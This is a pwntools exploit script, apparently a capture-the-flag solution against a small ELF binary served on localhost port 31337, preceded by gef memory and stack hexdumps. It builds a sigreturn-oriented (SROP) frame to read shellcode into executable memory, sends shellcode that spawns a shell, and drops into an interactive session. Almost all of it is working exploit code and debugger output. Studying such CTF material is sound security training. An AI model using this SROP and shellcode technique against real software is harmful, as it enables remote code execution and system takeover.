#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 31337

""" right before sigreturn
gef➤  hexdump byte --size 128 0x28000 
0x0000000000028000     7f 45 4c 46 02 01 01 00 48 89 e6 66 ff cc eb 42    .ELF....H..f...B
0x0000000000028010     02 00 3e 00 01 00 00 00 28 80 02 00 00 00 00 00    ..>.....(.......
0x0000000000028020     3a 00 00 00 00 00 00 00 66 81 2d 22 00 00 00 02    :.......f.-"....
0x0000000000028030     f0 eb d5 00 40 00 38 00 01 00 01 00 00 00 07 00    ....@.8.........
0x0000000000028040     00 00 00 00 00 00 00 00 00 00 00 80 02 00 00 00    ................
0x0000000000028050     00 00 66 b8 0f 00 0f 05 eb ce 72 00 00 00 00 00    ..f.......r.....
0x0000000000028060     00 00 72 00 00 00 00 00 00 00 74 68 31 35 67 6f    ..r.......th15go
0x0000000000028070     6c 66 00 00 00 00 00 00 00 00 00 00 00 00 00 00    lf..............

gef➤  hexdump byte --size 128 $rsp
0x00007ffe4e893bee     00 00 41 41 41 41 41 41 41 41 41 41 41 41 41 41    ..AAAAAAAAAAAAAA
0x00007ffe4e893bfe     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
0x00007ffe4e893c0e     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
0x00007ffe4e893c1e     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
0x00007ffe4e893c2e     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
0x00007ffe4e893c3e     41 41 41 41 41 41 41 41 41 41 0a 4f 89 4e fe 7f    AAAAAAAAAA.O.N..
0x00007ffe4e893c4e     00 00 7a 4f 89 4e fe 7f 00 00 ad 4f 89 4e fe 7f    ..zO.N.....O.N..
0x00007ffe4e893c5e     00 00 ff 4f 89 4e fe 7f 00 00 33 50 89 4e fe 7f    ...O.N....3P.N..

"""

ADDR_SYSCALL = 0x28056

context(arch='amd64', os='linux')
#io = process("../container/sign2l")
io = remote(HOST, PORT)

shellcode = asm(shellcraft.sh())

frame = SigreturnFrame()
frame.rax = 0
frame.rip = ADDR_SYSCALL
frame.rdi = 0 
frame.rsi = ADDR_SYSCALL + 2
frame.rdx = len(shellcode)
frame.rsp = ADDR_SYSCALL & ~0xf

payload = b''
payload += bytes(frame)[2:] # First two bytes of frame gets replaced by \0

pause()

io.send(payload)
#io.flush()
sleep(1)
io.send(shellcode)

io.interactive()
